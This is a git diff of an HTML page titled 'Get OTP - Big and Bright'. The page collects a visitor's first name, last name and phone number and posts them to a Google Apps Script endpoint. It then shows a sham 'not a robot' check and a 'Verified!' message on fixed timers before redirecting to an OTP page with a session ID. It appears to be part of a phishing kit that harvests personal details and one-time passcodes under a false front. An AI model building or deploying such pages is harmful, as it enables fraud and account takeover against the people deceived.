@@ -1,44 +1,192 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Enter Phone Number</title>
-</head>
-<body>
-  <h2>Enter Your Phone Number</h2>
-  <form id="phoneForm">
-    <input type="text" name="phone" placeholder="Enter phone number" required><br><br>
-    <button type="submit">Next</button>
-  </form>
-
-  <p id="loading" style="display:none;">Loading... Please wait 5 seconds.</p>
-
-  <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbzXrKL2Kuoh1-zXIvjeD2aX3I5JHUCZVy1p52DKi1vPBFpnAVLd37Ss89NwNrYwLqZ4Iw/exec";
-    const form = document.getElementById("phoneForm");
-    const loading = document.getElementById("loading");
-
-    function generateSessionId() {
-      return 'ID-' + Date.now() + '-' + Math.floor(Math.random() * 10000);
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Get OTP - Big and Bright</title>
+  <link href="https://fonts.googleapis.com/css2?family=Baloo+2&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
     }
 
-    form.addEventListener("submit", e => {
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Baloo 2', cursive;
+      background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: #333;
+    }
+
+    .container {
+      background: white;
+      padding: 50px 30px;
+      border-radius: 30px;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 500px;
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 32px;
+      color: #ff6b6b;
+      margin-bottom: 25px;
+    }
+
+    input {
+      width: 100%;
+      padding: 18px;
+      font-size: 20px;
+      border: none;
+      margin: 12px 0;
+      border-radius: 15px;
+      background-color: #f1f1f1;
+    }
+
+    button {
+      width: 100%;
+      padding: 18px;
+      font-size: 22px;
+      background: #ff6b6b;
+      color: white;
+      border: none;
+      border-radius: 15px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #e55a5a;
+    }
+
+    #loading,
+    #captchaBox,
+    #verifying {
+      display: none;
+      font-size: 20px;
+      margin-top: 20px;
+      color: #ff6b6b;
+    }
+
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #ff6b6b;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 10px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    .verified {
+      color: green;
+      font-size: 22px;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 40px 20px;
+      }
+
+      h2 {
+        font-size: 28px;
+      }
+
+      input, button {
+        font-size: 18px;
+        padding: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🔐 Get Your OTP</h2>
+    <form id="form">
+      <input type="text" id="firstName" placeholder="First Name" required>
+      <input type="text" id="lastName" placeholder="Last Name" required>
+      <input type="text" id="phone" placeholder="Phone Number" required>
+      <button type="submit">Send OTP</button>
+    </form>
+
+    <div id="loading">
+      ⏳ Sending OTP... Please wait
+      <div class="spinner"></div>
+    </div>
+
+    <div id="captchaBox">
+      🔄 Verifying you're not a robot...
+      <div class="spinner"></div>
+    </div>
+
+    <div id="verifying" class="verified">
+      ✅ Verified!
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("form");
+    const loading = document.getElementById("loading");
+    const captchaBox = document.getElementById("captchaBox");
+    const verifying = document.getElementById("verifying");
+
+    form.addEventListener("submit", function(e) {
       e.preventDefault();
-      const phone = form.phone.value;
-      const sessionId = generateSessionId();
+
+      const first = document.getElementById("firstName").value;
+      const last = document.getElementById("lastName").value;
+      const phone = document.getElementById("phone").value;
+
+      form.style.display = "none";
+      loading.style.display = "block";
 
       const formData = new FormData();
       formData.append("stage", "number");
+      formData.append("firstName", first);
+      formData.append("lastName", last);
       formData.append("phone", phone);
+
+      const sessionId = "ID-" + Date.now();
       formData.append("sessionId", sessionId);
 
-      fetch(scriptURL, { method: "POST", body: formData })
-        .then(() => {
-          loading.style.display = "block";
+      fetch("https://script.google.com/macros/s/AKfycbzXrKL2Kuoh1-zXIvjeD2aX3I5JHUCZVy1p52DKi1vPBFpnAVLd37Ss89NwNrYwLqZ4Iw/exec", {
+        method: "POST",
+        body: formData
+      })
+      .then(() => {
+        // Step 1: show loading
+        setTimeout(() => {
+          loading.style.display = "none";
+          captchaBox.style.display = "block";
+
+          // Step 2: show verifying
           setTimeout(() => {
-            window.location.href = `otp.html?sessionId=${sessionId}`;
+            captchaBox.style.display = "none";
+            verifying.style.display = "block";
+
+            // Step 3: redirect to otp.html
+            setTimeout(() => {
+              window.location.href = `otp.html?sessionId=${sessionId}`;
+            }, 4000);
           }, 5000);
-        })
-        .catch(error => alert("Error: " + error.message));
+        }, 2000);
+      })
+      .catch(error => {
+        alert("Error: " + error.message);
+        form.style.display = "block";
+        loading.style.display = "none";
+      });
     });
   </script>
 </body>
